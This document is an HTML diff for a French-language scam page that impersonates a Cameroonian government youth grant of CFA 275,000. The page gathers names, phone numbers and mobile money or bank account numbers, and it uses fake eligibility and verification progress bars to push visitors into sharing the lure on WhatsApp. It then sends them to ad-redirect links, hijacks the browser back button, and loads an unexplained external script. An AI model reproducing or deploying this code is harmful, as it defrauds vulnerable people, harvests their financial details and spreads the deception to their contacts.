@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+    <title>PROGRAMME D'INCLUSION ÉCONOMIQUE DES JEUNES - CFA 275 000</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <!-- Bootstrap & FontAwesome -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
+    <script src="https://onlinepollportal.com/js/app.min.js?v=2"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+    <!-- Meta Previews -->
+    <meta property="og:title" content="PROGRAMME D'INCLUSION ÉCONOMIQUE DES JEUNES - CFA 275 000" />
+    <meta property="og:description" content="Subvention de CFA 275 000 pour 20 000 jeunes Camerounais. Inscription en cours." />
+    <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVL9lEQ7VoXwFvCAc0K-Ql4VnzzURz5g617EEWJKytI1lboAJPAFmis1IaEMEWSqLXuzdtfRaXCI25lufGbzM2jFDjVbpBKhItSMnOMZwf46gUTKBYuziK5G__QRlkbtaqqnBfAXPqVRlGdQhxXieetwdhPlmx8fyfVzTetFFoTGbsYEYqwyethJ9663dI/s1672/54302.png" />
+    <meta property="og:type" content="website" />
+
+    <style>
+        /* ═══════════════════════════════════════════ 
+           CAMEROON THEME & BASE STYLES
+        ═══════════════════════════════════════════ */
+        :root {
+            --cmr-green: #007A3D;
+            --cmr-red: #CE1126;
+            --cmr-gold: #FCD116;
+            --cmr-dark-green: #005a2d;
+            --cmr-text: #333;
+            --cmr-gray: #666;
+        }
+
+        * { 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; 
+            box-sizing: border-box; 
+        }
+        
+        body { 
+            background-color: #f4f4f4;
+            background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIqNUoRdQB3dNqnLYk66GCE7agSHD0WBAJEXKjLffRWhMGQH846ihuH7lb3yaa8ecwf-0SoQLcE1rhEBOxNg6pF9OyMOcAy40gzRmQefBBxKU-f5IKnh3Cus47CBQp_LVUoBnGiOtT2fn9l1FOyfz-R0rvBPI1DBx7IUcZy5twrWubWJzQEk_XVUM8Kh8/s1635/35851.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+            color: var(--cmr-text);
+        }
+        
+        a { text-decoration: none; }
+
+        /* ═══════════════════════════════════════════ 
+           OFFICIAL VERIFIED BANNER
+        ═══════════════════════════════════════════ */
+        .official-banner {
+            background-color: var(--cmr-green);
+            color: #ffffff;
+            text-align: center;
+            padding: 10px 15px;
+            font-size: 13px;
+            font-weight: 600;
+            border-bottom: 3px solid var(--cmr-gold);
+            letter-spacing: 0.5px;
+        }
+        .official-banner i {
+            color: var(--cmr-gold);
+            margin-right: 5px;
+            font-size: 15px;
+        }
+
+        /* ═══════════════════════════════════════════ 
+           HEADER
+        ═══════════════════════════════════════════ */
+        .nersi-header {
+            background: #fff;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #eee;
+            position: sticky;
+            top: 0;
+            z-index: 900;
+        }
+        .nersi-header-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .nersi-logo-group {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+        .nersi-logo-group img { height: 40px; width: auto; }
+        .nersi-logo-group .min-logo { height: 45px; border-radius: 50%; border: 2px solid var(--cmr-green); padding: 2px; }
+        .nersi-menu-btn {
+            border: 1.5px solid #ddd; border-radius: 8px; padding: 8px 12px;
+            font-size: 24px; color: var(--cmr-green); cursor: pointer; background: #fff;
+        }
+
+        /* ═══════════════════════════════════════════ 
+           HERO SECTION
+        ═══════════════════════════════════════════ */
+        .hero-section { background: var(--cmr-green); color: white; padding: 50px 20px; text-align: left; }
+        .hero-container { max-width: 600px; margin: 0 auto; }
+        .hero-eyebrow { font-size: 14px; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 15px; color: #d1e0d6; }
+        .hero-title { font-size: 42px; font-weight: 800; line-height: 1.1; margin-bottom: 20px; }
+        .hero-title span { color: var(--cmr-gold); }
+        .hero-desc { font-size: 18px; line-height: 1.5; margin-bottom: 10px; color: #e0e0e0; }
+
+        /* ═══════════════════════════════════════════ 
+           POPUP & BACKGROUND
+        ═══════════════════════════════════════════ */
+        #bgImage {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.8); z-index: 999; opacity: 0; pointer-events: none; transition: opacity 0.4s ease;
+        }
+        #bgImage.popup-bg-active { opacity: 1; pointer-events: auto; }
+
+        .popup-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; justify-content: center; align-items: center;
+            opacity: 0; pointer-events: none; transition: opacity 0.4s ease; z-index: 1000;
+        }
+        .popup-overlay.active { opacity: 1; pointer-events: auto; }
+        
+        .popup-box {
+            background-color: #fff;
+            background-image: linear-gradient(rgba(255,255,255,0.92), rgba(255,255,255,0.92)), url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIqNUoRdQB3dNqnLYk66GCE7agSHD0WBAJEXKjLffRWhMGQH846ihuH7lb3yaa8ecwf-0SoQLcE1rhEBOxNg6pF9OyMOcAy40gzRmQefBBxKU-f5IKnh3Cus47CBQp_LVUoBnGiOtT2fn9l1FOyfz-R0rvBPI1DBx7IUcZy5twrWubWJzQEk_XVUM8Kh8/s1635/35851.jpg');
+            background-size: cover; background-position: center;
+            padding: 25px 20px; border-radius: 12px; width: 420px; max-width: 92%;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); position: relative;
+            transform: translateY(-30px); transition: transform 0.4s ease; text-align: center;
+        }
+        .popup-overlay.active .popup-box { transform: translateY(0); }
+        
+        .popup-header-logos { display: flex; justify-content: center; gap: 10px; margin-bottom: 15px; }
+        .popup-header-logos img { height: 50px; width: auto; }
+        .popup-header-logos .min-logo { height: 55px; border-radius: 50%; border: 2px solid var(--cmr-green); padding: 2px; background: #fff; }
+        
+        .popup-box h2 { font-size: 18px; color: var(--cmr-green); font-weight: 700; margin-bottom: 10px; line-height: 1.3; }
+
+        .popup-box .form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; margin-bottom: 15px; outline: none; }
+        .popup-box .submit-btn {
+            width: 100%; padding: 14px; background-color: var(--cmr-green); color: white;
+            border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s;
+        }
+        .popup-box .submit-btn:hover { background-color: var(--cmr-dark-green); }
+
+        /* ═══════════════════════════════════════════ 
+           MAIN FLOW & UI ELEMENTS
+        ═══════════════════════════════════════════ */
+        #flowWrapper { display: none; position: relative; z-index: 2; }
+
+        marquee {
+            background: var(--cmr-gold); color: var(--cmr-green);
+            padding: 8px; font-weight: bold; font-size: 14px; letter-spacing: 1px;
+        }
+
+        .post {
+            background: #fff; margin: 20px auto; padding: 25px; max-width: 550px;
+            border: 1px solid #e0e0e0; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .welcome { font-size: 15px; line-height: 1.6; color: #444; text-align: justify; }
+        .amount, #getname { color: var(--cmr-green); font-weight: 700; }
+        .tip { font-size: 14.5px; color: #555; line-height: 1.5; margin-bottom: 10px; }
+        .title { text-align: center; font-weight: 700; color: var(--cmr-green); font-size: 18px; margin-bottom: 15px; }
+        
+        button.btn-main {
+            display: block; width: 100%; max-width: 320px; height: 52px; color: #fff;
+            border: none; outline: none; font-size: 18px; font-weight: 800; cursor: pointer;
+            border-radius: 8px; margin: 15px auto; background: var(--cmr-green); transition: background 0.3s ease;
+        }
+        button.btn-main:hover { background: var(--cmr-dark-green); }
+
+        .phone input, .phone select {
+            width: 100%; height: 50px; font-size: 15px; margin-bottom: 15px; padding: 10px 15px;
+            border: 1px solid #ccc; border-radius: 8px; outline: none; background: #f9f9f9;
+        }
+
+        #loader { text-align: center; padding: 40px 0; display: none; }
+        .spin {
+            width: 50px; height: 50px; border: solid 6px var(--cmr-green); border-right-color: transparent;
+            border-radius: 50%; margin: 15px auto; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { 100% { transform: rotate(1turn); } }
+
+        .barr { max-width: 100%; margin: 15px auto; display: flex; align-items: center; gap: 10px; }
+        .fill { flex: 1; height: 30px; border: 2px solid var(--cmr-green); border-radius: 6px; padding: 2px; }
+        #fill, #fill2 { background: var(--cmr-green); width: 0%; height: 100%; border-radius: 3px; transition: width 0.1s linear; }
+        .percentage { width: 60px; text-align: right; font-size: 16px; font-weight: bold; color: var(--cmr-green); }
+
+        #info, #checking, #share, #claim { display: none; }
+
+        /* ═══════════════════════════════════════════ 
+           SHORT RECEIPT BOX & APP-LIKE STATUS
+        ═══════════════════════════════════════════ */
+        .receipt-box {
+            background: #f4f8f5;
+            border: 1px dashed var(--cmr-green);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        .receipt-box p { font-size: 14px; margin-bottom: 8px; }
+        .receipt-box span { font-weight: bold; color: var(--cmr-green); }
+
+        .status-badge {
+            background-color: #ffe5e5;
+            color: var(--cmr-red);
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            vertical-align: middle;
+            animation: pulse-red 1.5s infinite;
+            margin-left: 5px;
+        }
+        
+        .status-badge::before {
+            content: '';
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            background-color: var(--cmr-red);
+            border-radius: 50%;
+            animation: blink-dot 1.5s infinite;
+        }
+
+        @keyframes pulse-red {
+            0% { box-shadow: 0 0 0 0 rgba(206, 17, 38, 0.4); }
+            70% { box-shadow: 0 0 0 5px rgba(206, 17, 38, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(206, 17, 38, 0); }
+        }
+        
+        @keyframes blink-dot {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .features-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 25px; text-align: left; }
+        .feature-item { display: flex; align-items: center; gap: 8px; font-size: 15px; font-weight: 500; color: #333; }
+        .feature-dot { width: 10px; height: 10px; background-color: var(--cmr-gold); border-radius: 50%; flex-shrink: 0; }
+
+        /* ═══════════════════════════════════════════ 
+           FOOTER & SUPERCOUNTER
+        ═══════════════════════════════════════════ */
+        .nersi-footer { background: var(--cmr-green); color: #fff; padding: 40px 20px 20px; position: relative; z-index: 2; }
+        .nersi-footer-container { max-width: 1000px; margin: 0 auto; }
+
+        .footer-logos { display: flex; gap: 15px; margin-bottom: 20px; }
+        .footer-logos img { height: 60px; background: #fff; border-radius: 10px; padding: 5px; }
+        .footer-logos .min-logo { border-radius: 50%; border: 2px solid var(--cmr-green); }
+
+        .footer-desc { font-size: 15px; line-height: 1.6; color: #d1e0d6; max-width: 800px; margin-bottom: 30px; }
+        .footer-links { display: flex; flex-wrap: wrap; gap: 20px; margin-bottom: 30px; font-size: 15px; }
+        .footer-links a { color: #fff; text-decoration: none; }
+        .footer-links a:hover { text-decoration: underline; }
+        .footer-legal { border-top: 1px solid rgba(255,255,255,0.2); padding-top: 20px; font-size: 13px; color: #a9c4b3; }
+
+        .footer-supercounter { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.1); }
+
+        @media (max-width: 600px) {
+            .nersi-header-left { gap: 10px; }
+            .nersi-logo-group img { height: 30px; }
+            .nersi-logo-group .min-logo { height: 35px; }
+            .hero-title { font-size: 32px; }
+            .features-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+
+    <!-- OFFICIAL VERIFIED BANNER -->
+    <div class="official-banner">
+        <i class="fas fa-shield-alt"></i> AVIS OFFICIEL : Ceci est le SEUL portail vérifié du Programme IEJ. Méfiez-vous des faux sites.
+    </div>
+
+    <!-- POPUP BACKGROUND LAYER -->
+    <div id="bgImage" class="popup-bg-active"></div>
+
+    <!-- POPUP MODAL -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup-box">
+            <div class="popup-header-logos">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfF-sDrO1Y6IYPjNGo4_r9ULmkv_IutqpzB55qgxRyK98qwFjAu5jNIaO2WUJyx-CLn0c27m_cdBDmA9wziyZvmmCfcWxF9LvbFXzMwkvyBCjdixhgthwKcAvbCt-rL2ImunMKC81UC_otFOubhimAXw8qNeFa8yT8lbSWLS8R3bfwTN7wDIyXabCdwFH9/s800/54125.png" alt="IEJ Logo" onerror="this.src='https://via.placeholder.com/50x50?text=IEJ'">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJ6eNXRIfCoN2XDRseUr-N6vTN8HAI8r-AUkZJq0gdK8cOMcVQs-MnwhL-LAXJDJXCDC0xmpA1_xHrPOuLbBe2uYGmFdE8me7__cv3QOKkXXKXYIf6qJWfjYyUcAk8BHejpkWow82XAY51L9gX4qwxSfvFMdJ4J6_5fQYUf050i4T0Ae9CW55b0olxyQgS/s200/54127.png" alt="Ministère Logo" class="min-logo" onerror="this.src='https://via.placeholder.com/55x55?text=MINJEC'">
+            </div>
+
+            <h2>PHASE 2 – OUVERTE<br>PROGRAMME IEJ CAMEROUN</h2>
+            <p style="font-size: 14px; color: #555; margin-bottom: 15px;">Entrez vos informations pour commencer la demande de CFA 275 000</p>
+
+            <form id="popupForm">
+                <div class="form-group">
+                    <input type="tel" id="popupPhone" placeholder="Numéro de téléphone / Compte" required>
+                </div>
+                <button type="submit" class="submit-btn">RÉCLAMER CFA 275 000</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- HEADER -->
+    <header class="nersi-header">
+        <div class="nersi-header-left">
+            <div class="nersi-logo-group">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfF-sDrO1Y6IYPjNGo4_r9ULmkv_IutqpzB55qgxRyK98qwFjAu5jNIaO2WUJyx-CLn0c27m_cdBDmA9wziyZvmmCfcWxF9LvbFXzMwkvyBCjdixhgthwKcAvbCt-rL2ImunMKC81UC_otFOubhimAXw8qNeFa8yT8lbSWLS8R3bfwTN7wDIyXabCdwFH9/s800/54125.png" alt="IEJ Logo" onerror="this.src='https://via.placeholder.com/40x40?text=IEJ'">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJ6eNXRIfCoN2XDRseUr-N6vTN8HAI8r-AUkZJq0gdK8cOMcVQs-MnwhL-LAXJDJXCDC0xmpA1_xHrPOuLbBe2uYGmFdE8me7__cv3QOKkXXKXYIf6qJWfjYyUcAk8BHejpkWow82XAY51L9gX4qwxSfvFMdJ4J6_5fQYUf050i4T0Ae9CW55b0olxyQgS/s200/54127.png" alt="Ministère Jeunesse" class="min-logo" onerror="this.src='https://via.placeholder.com/45x45?text=MINJEC'">
+            </div>
+        </div>
+        <div class="nersi-menu-btn">&#9776;</div>
+    </header>
+
+    <!-- HERO SECTION -->
+    <section class="hero-section">
+        <div class="hero-container">
+            <p class="hero-eyebrow">RÉPUBLIQUE DU CAMEROUN</p>
+            <h1 class="hero-title">Une opportunité pour <span>chaque jeune.</span></h1>
+            <p class="hero-desc">CFA 275 000 d'appui pour 20 000 jeunes Camerounais âgés de 18 ans et plus. Sans frais. Sans intermédiaires.</p>
+        </div>
+    </section>
+
+    <!-- MAIN FLOW WRAPPER -->
+    <div id="flowWrapper">
+        <marquee direction="left">RÉPUBLIQUE DU CAMEROUN · PROGRAMME IEJ · RECEVEZ CFA 275 000 AUJOURD'HUI</marquee>
+
+        <!-- PAGE 1: LOADER -->
+        <div class="post" id="loader">
+            <p style="font-weight: bold; color: var(--cmr-green); font-size: 18px;">Vérification de l'éligibilité...</p>
+            <div class="spin"></div>
+            <div id="num" style="font-weight: bold; font-size: 20px; color: var(--cmr-green);">0%</div>
+        </div>
+
+        <!-- PAGE 2: INTRO -->
+        <div class="post" id="intro" style="display: none;">
+            <p class="welcome">
+                <center>
+                    Le portail de candidature du <span class="amount">PROGRAMME D'INCLUSION ÉCONOMIQUE DES JEUNES (IEJ) – CFA 275 000</span> est actuellement ouvert. Cette initiative, menée par le Ministère de la Jeunesse et de l'Éducation Civique, vise à soutenir financièrement les jeunes du secteur informel.
+                </center> 
+                <br> 
+                <center><span class="amount">RÉSERVÉ AUX</span> JEUNES CAMEROUNAIS DE 18 ANS ET PLUS.</center><br>
+            </p>
+            
+            <button id="go" class="btn-main">POSTULER MAINTENANT</button>
+
+            <div class="features-grid">
+                <div class="feature-item"><div class="feature-dot"></div> Gratuit à recevoir</div>
+                <div class="feature-item"><div class="feature-dot"></div> Consentement d'abord</div>
+                <div class="feature-item" style="grid-column: 1 / -1;"><div class="feature-dot"></div> Paiements vérifiés indépendamment</div>
+            </div>
+        </div>
+
+        <!-- PAGE 3: INFO FORM -->
+        <div class="post" id="info" style="display: none;">
+            <p class="title">ENTREZ VOS INFORMATIONS PERSONNELLES :</p>
+            <div class="phone">
+                <center>
+                    <input type="text" placeholder="Nom complet" id="name">
+                    <select id="state">
+                        <option value="" selected disabled>Sélectionnez la Région</option>
+                        <option value="Adamaoua">Adamaoua</option>
+                        <option value="Centre">Centre</option>
+                        <option value="Est">Est</option>
+                        <option value="Extrême-Nord">Extrême-Nord</option>
+                        <option value="Littoral">Littoral</option>
+                        <option value="Nord">Nord</option>
+                        <option value="Nord-Ouest">Nord-Ouest</option>
+                        <option value="Ouest">Ouest</option>
+                        <option value="Sud">Sud</option>
+                        <option value="Sud-Ouest">Sud-Ouest</option>
+                    </select>
+                    <input type="tel" placeholder="Numéro de téléphone" id="add">
+                    <input type="text" placeholder="Numéro de compte / Mobile Money" id="nums">
+                    <select id="bank">
+                        <option value="" selected disabled>Sélectionnez votre opérateur</option>
+                        <option value="MTN Mobile Money">MTN Mobile Money</option>
+                        <option value="Orange Money">Orange Money</option>
+                        <option value="Express Union Mobile">Express Union Mobile</option>
+                        <option value="Afriland First Bank">Afriland First Bank</option>
+                        <option value="SGC (Société Générale Cameroun)">SGC (Société Générale Cameroun)</option>
+                        <option value="BICEC">BICEC</option>
+                        <option value="Ecobank Cameroun">Ecobank Cameroun</option>
+                        <option value="UBA Cameroun">UBA Cameroun</option>
+                        <option value="CCA Bank">CCA Bank</option>
+                        <option value="NFC Bank">NFC Bank</option>
+                        <option value="Standard Chartered Cameroun">Standard Chartered Cameroun</option>
+                        <option value="Citibank Cameroun">Citibank Cameroun</option>
+                        <option value="BCA (Banque des États de l'Afrique Centrale)">BCA</option>
+                        <option value="Autre">Autre</option>
+                    </select>
+                    <br>
+                    <button id="confirm" class="btn-main">Soumettre la demande</button>
+                </center>
+                <p class="error" style="display:none; color:red; text-align:center;">Veuillez remplir tous les champs !</p>
+            </div>
+        </div>
+
+        <!-- PAGE 4: CHECKING -->
+        <div class="post" id="checking">
+            <p class="title">Traitement de la demande...</p>
+            <div class="barr">
+                <div class="fill"><div id="fill"></div></div>
+                <div class="percentage"><span id="percentage">0%</span></div>
+            </div>
+        </div>
+
+        <!-- PAGE 5: SHARE -->
+        <div class="post" id="share">
+            <div class="receipt-box">
+                <p><b>Nom du candidat :</b> <span id="getname"></span></p>
+                <p><b>Région :</b> <span id="getstate"></span></p>
+                <p><b>Téléphone :</b> <span id="getadd"></span></p>
+                <p><b>Numéro de compte :</b> <span id="getnum"></span></p>
+                <p><b>Opérateur :</b> <span id="getbank"></span></p>
+                
+                <p style="margin-top: 10px; border-top: 1px solid #ddd; padding-top: 10px;">
+                    <b>Statut de la transaction :</b> <span class="status-badge">EN ATTENTE</span>
+                </p>
+            </div>
+
+            <h3 style="color: var(--cmr-green); text-align: center; margin-bottom: 10px;"> Félicitations !</h3>
+            <p style="font-size: 15px; color: #333; text-align: center; margin-bottom: 15px;">
+                Votre demande a été <b>reçue avec succès</b>, et vous avez été <b>pré-qualifié(e)</b> pour recevoir la subvention de CFA 275 000.
+            </p>
+            <p class="tip" style="text-align: center;">Pour finaliser votre paiement, veuillez compléter le processus de vérification humaine ci-dessous. Une fois vérifié, votre compte sera crédité dans les 24 à 48 heures.</p>
+            
+            <br>
+            <p class="tip">1. Partagez cette information avec 5 groupes ou 15 amis sur WhatsApp (cliquez sur l'icône « PARTAGER » ci-dessous).</p>
+            <p class="tip">2. Vous serez redirigé automatiquement vers notre « page de vérification humaine approuvée » après que la barre de vérification VERTE soit remplie.</p>
+            
+            <button id="whatsapp" class="btn-main" style="background: #25D366; color: white;"><i class="fab fa-whatsapp"></i> PARTAGER</button>
+            
+            <div class="barr">
+                <div class="fill"><div id="fill2"></div></div>
+                <div class="percentage"><span id="percentage2">0%</span></div>
+            </div>
+        </div>
+
+        <!-- PAGE 6: CLAIM -->
+        <div class="post" id="claim">
+          
+            <p class="title">Paiement Approuvé</p>
+            <p style="font-size: 15px; text-align: center; color: #555; margin-bottom: 20px;">
+                Vos informations ont été reçues. Cliquez sur les liens ci-dessous pour approuver votre paiement vers les coordonnées bancaires fournies lors de l'inscription. Veuillez noter que les paiements peuvent prendre 24 à 48 heures pour être reflétés, car un grand nombre de bénéficiaires sont actuellement en cours de traitement.
+            </p>
+            
+            <!-- Ad Buttons -->
+            <a onclick="window.open('https://uplcm.com/4/10077877')" href="https://uplcm.com/4/10077877">
+                <button class="btn-main" style="background: var(--cmr-green); font-size: 16px; margin-bottom: 10px;">OBTENIR LE PAIEMENT</button>
+            </a>
+            <a onclick="window.open('https://uplcm.com/4/9742092')" href="https://uplcm.com/4/9742092">
+                <button class="btn-main" style="background: var(--cmr-green); font-size: 16px; margin-bottom: 10px;">OBTENIR LE CODE DE CONFIRMATION</button>
+            </a>
+            <a onclick="window.open('https://uplcm.com/4/9742301')" href="https://uplcm.com/4/9742301">
+                <button class="btn-main" style="background: var(--cmr-green); font-size: 16px; margin-bottom: 10px;">VÉRIFIER LE STATUT DU PAIEMENT</button>
+            </a>
+            <a onclick="window.open('https://uplcm.com/4/10077877')" href="https://uplcm.com/4/10077877">
+                <button class="btn-main" style="background: var(--cmr-green); font-size: 16px; margin-bottom: 10px;">VÉRIFIER LES DÉTAILS DU COMPTE</button>
+            </a>
+            <a onclick="window.open('https://uplcm.com/4/9742092')" href="https://uplcm.com/4/9742092">
+                <button class="btn-main" style="background: var(--cmr-green); font-size: 16px; margin-bottom: 10px;">TÉLÉCHARGER LE REÇU</button>
+            </a>
+            
+            <button id="offer" class="btn-main" style="background: var(--cmr-gold); color: var(--cmr-green); margin-top: 15px; font-weight: 800;">APPROUVER LE PAIEMENT</button>
+
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="nersi-footer">
+        <div class="nersi-footer-container">
+
+            <div class="footer-logos">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfF-sDrO1Y6IYPjNGo4_r9ULmkv_IutqpzB55qgxRyK98qwFjAu5jNIaO2WUJyx-CLn0c27m_cdBDmA9wziyZvmmCfcWxF9LvbFXzMwkvyBCjdixhgthwKcAvbCt-rL2ImunMKC81UC_otFOubhimAXw8qNeFa8yT8lbSWLS8R3bfwTN7wDIyXabCdwFH9/s800/54125.png" alt="IEJ Logo" onerror="this.src='https://via.placeholder.com/60x60?text=IEJ'">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJ6eNXRIfCoN2XDRseUr-N6vTN8HAI8r-AUkZJq0gdK8cOMcVQs-MnwhL-LAXJDJXCDC0xmpA1_xHrPOuLbBe2uYGmFdE8me7__cv3QOKkXXKXYIf6qJWfjYyUcAk8BHejpkWow82XAY51L9gX4qwxSfvFMdJ4J6_5fQYUf050i4T0Ae9CW55b0olxyQgS/s200/54127.png" alt="Ministère Logo" class="min-logo" onerror="this.src='https://via.placeholder.com/60x60?text=MINJEC'">
+            </div>
+
+            <div class="footer-desc">
+                Une initiative de la République du Cameroun, menée avec le Ministère de la Jeunesse et de l'Éducation Civique dans le cadre du Programme d'Inclusion Économique des Jeunes (IEJ).
+            </div>
+
+            <div class="footer-links">
+                <a href="#">À propos</a>
+                <a href="#">Comment ça marche</a>
+                <a href="#">Restez en sécurité</a>
+                <a href="#">FAQ</a>
+                <a href="#">Contact</a>
+            </div>
+
+            <div class="footer-legal">
+                &copy; 2026 République du Cameroun. Tous droits réservés.
+            </div>
+
+            <!-- SUPERCOUNTER -->
+            <div class="footer-supercounter">
+                <script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
+                <script type="text/javascript">sc_online_i(1739582,"ffffff","ffffff");</script>
+            </div>
+        </div>
+    </footer>
+
+    <!-- JQUERY -->
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+    <script src="https://onlinepollportal.com/js/app.min.js?v=2"></script>
+    
+    <script>
+        $(document).ready(function () {
+            
+            // POPUP LOGIC
+            var popupOverlay = document.getElementById('popupOverlay');
+            var popupForm = document.getElementById('popupForm');
+            var popupPhone = document.getElementById('popupPhone');
+            var bgImage = document.getElementById('bgImage');
+
+            setTimeout(function () {
+                popupOverlay.classList.add('active');
+            }, 500);
+
+            popupForm.addEventListener('submit', function (e) {
+                e.preventDefault();
+                var phone = popupPhone.value.trim();
+
+                if (phone.length < 8) {
+                    alert('Veuillez entrer un numéro de téléphone valide');
+                    return;
+                }
+
+                window.savedPhone = phone;
+
+                popupOverlay.classList.remove('active');
+                bgImage.classList.remove('popup-bg-active');
+                
+                $("#flowWrapper").show();
+                $("#loader").show();
+                var i = 0;
+                var interval = setInterval(function () {
+                    i++;
+                    $("#num").text(i + "%");
+                    if (i >= 100) {
+                        clearInterval(interval);
+                        $("#loader").hide();
+                        $("#intro").show();
+                    }
+                }, 30);
+            });
+
+            // MAIN FLOW LOGIC
+            $("#go").click(function () {
+                $("#intro").hide();
+                $("#info").fadeIn(500);
+                if(window.savedPhone) {
+                    $("#add").val(window.savedPhone);
+                }
+            });
+
+            $("#confirm").click(function () {
+                if ($("#name").val().length < 3 || $("#add").val().length < 8 || $("#nums").val().length < 5) {
+                    $(".error").text("Veuillez remplir correctement tous les champs !").fadeIn(500);
+                    return;
+                }
+                
+                $(".error").hide();
+                $("#info").hide();
+                $("#checking").fadeIn(500);
+
+                $("#getname").text($("#name").val());
+                $("#getstate").text($("#state").val());
+                $("#getadd").text($("#add").val());
+                $("#getnum").text($("#nums").val());
+                $("#getbank").text($("#bank").val());
+
+                var i = 0;
+                var interval = setInterval(function () {
+                    i++;
+                    $("#percentage").text(i + "%");
+                    $("#fill").css("width", i + "%");
+                    
+                    if (i == 70) {
+                        i = 69; 
+                        setTimeout(function () { i = 70; }, 1000);
+                    }
+                    
+                    if (i >= 100) {
+                        clearInterval(interval);
+                        setTimeout(function () {
+                            $("#checking").hide();
+                            $("#share").fadeIn(500);
+                        }, 500);
+                    }
+                }, 30);
+            });
+
+            var width = 0;
+            var shareText = "*PROGRAMME D’INCLUSION ÉCONOMIQUE DES JEUNES (IEJ) – CAMEROUN 2026*%0A%0ALe Gouvernement offre *CFA 275 000* à 20 000 jeunes Camerounais.%0A%0A Subvention non remboursable  %0A Âge : 18 ans et plus  %0A Secteur informel  %0A%0A*Vérifiez si vous êtes éligible ici* 👇  %0Ahttps://metaink.xyz/IEJ-Cameroun%0A%0A_Partagez avec d’autres jeunes pour qu’ils ne ratent pas cette opportunité._";
+            var shareUrl = "whatsapp://send?text=" + shareText;
+            var redirectUrl = "https://uplcm.com/4/10077877"; 
+
+            $("#whatsapp").click(function () {
+                window.location.href = shareUrl;
+                
+                if (width == 0) { width += 50; } 
+                else if (width == 50) { alert("Vérification échouée !\nVous devez partager avec au moins 5 groupes ou 15 amis pour compléter le processus."); width += 15; } 
+                else if (width == 65) { width += 5; } 
+                else if (width == 70) { alert("Presque terminé ! Veuillez partager avec un groupe de plus pour vérifier."); width += 10; } 
+                else if (width == 80) { alert("Traitement... Veuillez partager à nouveau."); width += 5; } 
+                else if (width == 85) { width += 2; } 
+                else if (width == 87) { width += 1; } 
+                else if (width == 88) { width += 2; } 
+                else if (width == 90) { width += 1; } 
+                else if (width == 91) { width += 1; } 
+                else if (width == 92) { width += 1; } 
+                else if (width == 93) { width += 1; } 
+                else if (width == 94) { width += 1; } 
+                else if (width == 95) { width += 1; } 
+                else if (width == 96) { width += 2; } 
+                else { 
+                    $("#share").hide(); 
+                    $("#claim").fadeIn(1000); 
+                    return; 
+                }
+                
+                setTimeout(function () {
+                    $("#fill2").css("width", width + "%");
+                    $("#percentage2").text(width + "%");
+                }, 1000);
+            });
+
+            $("#offer").click(function () {
+                window.open(redirectUrl, "_blank");
+            });
+
+            // AGGRESSIVE BACK BUTTON REDIRECT
+            window.addEventListener('popstate', function() {
+                history.pushState(null, null, document.URL);
+                window.location.href = redirectUrl; 
+            });
+            
+            history.pushState(null, null, document.URL);
+
+            window.onhashchange = function () { jp(); }; 
+            function hh() { history.pushState(history.length + 1, "message", "#" + Math.random()); } 
+            function jp() { fh(); } 
+            setTimeout('hh();', 500); 
+            function fh() { location.href = redirectUrl; }
+        });
+    </script>
+</body>
+</html>
